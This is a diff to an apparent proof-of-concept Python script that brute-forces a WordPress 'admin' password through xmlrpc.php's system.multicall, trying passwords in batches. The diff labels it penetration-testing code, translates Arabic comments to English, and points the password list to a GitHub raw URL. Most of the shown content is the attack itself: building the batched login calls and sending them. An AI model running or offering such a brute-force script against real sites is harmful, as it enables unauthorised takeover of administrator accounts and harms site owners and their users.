@@ -1,3 +1,6 @@
+# PoC code
+# system.multicall Bruteforce penetration testing code
+#-------------------------------------
 import xmlrpc.client
 from colorama import Fore, init
 
@@ -11,7 +14,7 @@ init(autoreset=True)
 
 url = "https://www.example.com/xmlrpc.php"
 username = "admin"
-passwords_file = "passwords.txt" #قائمة كلمات المرور ::::::
+passwords_file = "passwords.txt" #Password list:https://raw.githubusercontent.com/Hawkmoth609/Snake-game/main/list.txt ::::::
 batch_size = 4
 
 with open(passwords_file, 'r', encoding='utf-8') as f:
@@ -34,7 +37,7 @@ for i in range(0, len(passwords), batch_size):
         })
 
     try:
-        print(f"{u}[●] Group number(دفعت الباسويرد) {batch_count + 1}~~~")
+        print(f"{u}[●] Group number(Batch of passwords) {batch_count + 1}~~~")
         response = client.system.multicall(multicall_data)
 
         for pw, res in zip(batch, response):
